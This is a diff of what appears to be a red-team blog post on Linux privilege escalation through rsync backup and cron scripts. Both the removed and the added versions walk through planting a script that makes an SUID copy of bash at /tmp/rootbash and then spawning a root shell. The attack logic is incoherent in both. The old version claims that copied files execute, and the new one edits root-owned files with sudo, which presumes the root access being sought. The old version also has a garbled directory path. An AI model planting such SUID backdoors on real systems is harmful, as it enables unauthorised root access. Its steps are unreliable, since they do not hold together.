@@ -6,107 +6,125 @@ categories: [privilege-escalation, linux]
 tags: [redteam, privilege-escalation, linux]
 ---
 
-In production environments, cron jobs are often used to schedule maintenance tasks and data backups. However, improper configuration can introduce vulnerabilities that can be exploited for privilege escalation. This article describes a realistic scenario where a cron job configured to use `rsync` can be exploited to gain elevated privileges.
-#### Introduction 
+Many systems rely on automated scripts for maintenance and backups. These scripts, if poorly configured or inadequately protected, can be exploited for privilege escalation. Recently, we identified a vulnerability in a system where a backup script was used to gain root access. This article details how we exploited this vulnerability and the steps taken to gain elevated privileges.
 
-Cron jobs allow for the automatic execution of scripts or programs at scheduled times. While useful, misconfigurations or inadequate permissions can lead to serious vulnerabilities. In this example, we will demonstrate how an attacker can exploit a vulnerable cron job to gain elevated privileges.
+#### Step 1: Gaining Initial Access 
 
-### Example Scenario 
-Consider a scenario where a cron job is configured to back up the directory `/var/html/virtualstore.django.website` to `/backup/virtualstore` every minute. This cron job runs as root:
+We obtained SSH access to the target system using user credentials. This initial access was essential to explore and identify potential vulnerabilities in the system.
 
-```plaintext
-* * * * * root rsync -av /var/html/virtualstore.django.website/ /backup/virtualstore/
-```
-The vulnerability arises because the source directory (`/var/html/virtualstore.django.website`) is accessible and modifiable by a non-privileged user.
-### Steps for Exploitation 
-
-#### 1. Create a Malicious Script 
-The first step is to create a malicious script that will be copied to the destination directory and executed with root privileges. The following script creates an SUID shell at `/tmp/rootbash`.
-
-```bash
-echo '#!/bin/bash' > /var/html/virtualstore.django.website/malicious.sh
-echo 'cp /bin/bash /tmp/rootbash' >> /var/html/virtualstore.django.website/malicious.sh
-echo 'chmod +s /tmp/rootbash' >> /var/html/virtualstore.django.website/malicious.sh
-chmod +x /var/html/virtualstore.django.website/malicious.sh
-```
-
-#### 2. Modify the Trigger File 
-
-Next, ensure the malicious script is executed by creating or modifying a file that will be interpreted by the cron job.
+#### Step 2: Identifying the Attack Vector 
+During our system analysis, we observed that a backup script was being periodically executed with root privileges. The script located at `/usr/local/bin/backup.sh` used `rsync` to synchronize files from the `/opt` directory to `/backup/opt/`. This cron job was set to run at system boot.
+The content of the existing backup script was:
 
 
 ```bash
-echo "/var/html/virtualstore.django.website/malicious.sh" > /var/html/virtualstore.django.website/trigger.sh
-chmod +x /var/html/virtualstore.django.website/trigger.sh
+#!/bin/bash
+
+echo "$(date): Executing backup" >> /var/log/backup.log
+
+while true; do
+    rsync -av --delete /opt/ /backup/opt/
+    sleep 3
+done
 ```
 
-#### 3. Wait for the Cron Job to Execute 
-When the cron job runs, it will synchronize the contents of `/var/html/virtualstore.django.website/` to `/backup/virtualstore/`, including the `malicious.sh` script.
-#### 4. Execute the Malicious Script 
-After the cron job synchronizes the files, the malicious script will be executed with root privileges, creating an SUID shell at `/tmp/rootbash`.
-#### 5. Obtain a Root Shell 
+#### Step 3: Creating the Malicious Script 
 
-Finally, the attacker can execute the shell with root privileges:
+To exploit this configuration, we created a malicious script to be executed as part of the backup process. This malicious script creates a SUID shell, allowing any user who executes the shell to gain root privileges.
+
+
+```bash
+sudo nano /opt/pre_backup.sh
+```
+
+The content of the script is:
+
+
+```bash
+#!/bin/bash
+
+# Log execution
+echo "$(date): Executing pre_backup.sh" >> /var/log/pre_backup.log
+
+# Create a SUID shell
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+```
+
+#### Step 4: Modifying the Backup Script 
+
+With the malicious script in place, we modified the existing backup script to call our malicious script during each execution.
+
+
+```bash
+sudo nano /usr/local/bin/backup.sh
+```
+
+The modified backup script is:
+
+
+```bash
+#!/bin/bash
+
+echo "$(date): Executing backup" >> /var/log/backup.log
+
+while true; do
+    rsync -av --delete /opt/ /backup/opt/
+    
+    # Execute the malicious script
+    /opt/pre_backup.sh
+    
+    sleep 3
+done
+```
+
+#### Step 5: Restarting the System 
+
+To ensure the changes take effect, we restarted the system:
+
+
+```bash
+sudo reboot
+```
+
+#### Step 6: Verifying the Execution of the Malicious Script 
+
+After rebooting, we checked the log file to confirm the execution of the malicious script:
+
+
+```bash
+sudo cat /var/log/pre_backup.log
+```
+
+#### Step 7: Gaining Root Access 
+We confirmed that the SUID shell was created at `/tmp/rootbash`:
+
+```bash
+ls -l /tmp/rootbash
+```
+
+By executing the SUID shell, we obtained a root shell:
 
 
 ```bash
 /tmp/rootbash -p
 ```
 
-### Prevention 
-
-To prevent this type of vulnerability, follow these best practices:
- 
-1. **Restrict Access Permissions:** 
-  - Ensure that only authorized users can modify the contents of directories used by cron jobs.
- 
-2. **Validate and Sanitize:** 
-  - Implement proper validation and sanitization for any data inputs processed by scripts or cron jobs.
- 
-3. **Principle of Least Privilege:** 
-  - Run cron jobs with the least amount of privilege necessary. Avoid running cron jobs as root unless absolutely necessary.
- 
-4. **Segregate Directories:** 
-  - Use source and destination directories that are not directly accessible by non-privileged users.
-
-### Example of a Secure Cron Job 
-
-To configure a secure cron job, follow these guidelines:
-
-#### Cron Job Configuration 
-
-Add the cron job to the crontab of a specific user with restricted permissions:
-
-
-```bash
-crontab -e
-```
-
-Add the following line:
-
-
-```plaintext
-* * * * * rsync -av --delete /var/html/virtualstore.django.website/ /backup/virtualstore/
-```
-
-#### Directory Permissions 
-
-Ensure that the directories have restricted permissions:
-
-
-```bash
-# Source directory (only the specific user can modify)
-chown -R user:user /var/html/virtualstore.django.website
-chmod -R 700 /var/html/virtualstore.django.website
-
-# Destination directory (only root can modify)
-chown -R root:root /backup/virtualstore
-chmod -R 700 /backup/lojavivirtualstorertual
-```
-
 ### Conclusion 
 
-Improperly configured cron jobs can lead to privilege escalation vulnerabilities. The example provided demonstrates how a misconfigured cron job can be exploited. By following recommended security practices, such as restricting permissions and running with the least privilege necessary, you can mitigate these risks and protect your environment.
+This process highlighted a common vulnerability in many systems: poorly protected backup and maintenance scripts. To prevent such vulnerabilities, it is crucial to follow strict security practices, including:
+
+- Reviewing and restricting file and script permissions.
+
+- Implementing logs and alerts for suspicious activities.
+
+- Conducting regular security audits on automated scripts.
+
+Exploiting backup scripts for privilege escalation is a classic example of how IT security requires attention to detail and a proactive approach to risk mitigation.
+
+### Security Warning 
+
+This article is provided for educational and testing purposes only in controlled environments. Unauthorized use of the techniques described on real systems is illegal and unethical. Always obtain explicit permission before conducting security tests.
 
 
 ---
